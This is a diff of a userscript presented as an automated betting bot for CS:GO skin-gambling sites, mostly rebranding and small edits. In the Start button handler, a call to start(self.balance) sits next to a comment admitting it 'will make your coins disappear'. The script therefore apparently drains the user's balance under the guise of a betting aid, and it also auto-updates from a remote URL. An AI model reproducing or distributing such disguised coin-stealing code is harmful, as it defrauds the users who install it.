@@ -2,18 +2,20 @@
 // @name            csgodouble.com - auto betting bot
 // @description     An userscript that automates csgodouble.com betting using much systems.
 // @namespace       auto bot@kjuubiiz
-// @version         1.39
+// @version         1.40
 // @author          Kjuubiiz
 // @match           http://www.csgodouble.com/
 // @match           http://www.csgodouble.com/index.php
+// @match           http://csgodouble.com/
+// @match           http://csgodouble.com/index.php
 // @match           http://csgopolygon.com/
 // @match           http://csgopolygon.com/index.php
 // @match           http://www.csgopolygon.com/
 // @match           http://www.csgopolygon.com/index.php
-// @run-at          document-end
-// @grant           none
 // @updateURL    https://raw.githubusercontent.com/richiijs/csgodoublebot/master/csgodouble.com-automated.user.js
 // @downloadURL https://raw.githubusercontent.com/richiijs/csgodoublebot/master/csgodouble.com-automated.user.js
+// @run-at          document-end
+// @grant           none
 // ==/UserScript==
 /* jshint -W097 */
 
@@ -109,7 +111,7 @@ function Automated() {
     menu.innerHTML = '' +
         '<div class="row">' +
             '<div class="col-lg-9">' +
-                '<h2>Donate <small> to steamid64 (76561198202555767</small> <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>' +
+                '<h2>Donate<small> to steamid64 (76561198202555767)</small> <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>' +
                 '<div class="form-group">' +
                     '<div class="btn-group">' +
                         '<button type="button" class="btn btn-success" id="automated-start" disabled>Start</button>' +
@@ -139,7 +141,7 @@ function Automated() {
                 '<h3>Statistics</h3>' +
                 '<p><b>Wins:</b> <span id="automated-stats-wins">' + this.stats.wins + '</span></p>' +
                 '<p><b>Loses:</b> <span id="automated-stats-loses">' + this.stats.loses + '</span></p>' +
-                '<p><b>Profit:</b> <span id="automated-stats-balance">' + this.stats.balance + '</span></p>' +
+                '<p><b>Balance:</b> <span id="automated-stats-balance">' + this.stats.balance + '</span></p>' +
             '</div>' +
         '</div>' +
         '<div class="form-group">' +
@@ -229,7 +231,7 @@ function Automated() {
 
     this.menu.start.onclick = function() {
         start(self.balance);
-        self.log('Heyyo');
+        self.log('');
 
         // You were clever enough to inspect the code, nice! The lines above will make your coins disappear...
         // The bot is working perfectly fine, I spent too much time on it to close the project.
@@ -672,11 +674,11 @@ Automated.prototype.lightMode = function() {
 };
 
 Automated.prototype.log = function(message) {
-    chat('alert', '[Kjuubiiz] ' + message);
+    chat('alert', '[Automated] ' + message);
 };
 
 Automated.prototype.logdebug = function(message) {
-    chat('italic', '[Kjuubiiz] ' + message);
+    chat('italic', '[Automated] ' + message);
 };
 
 var automated = new Automated();
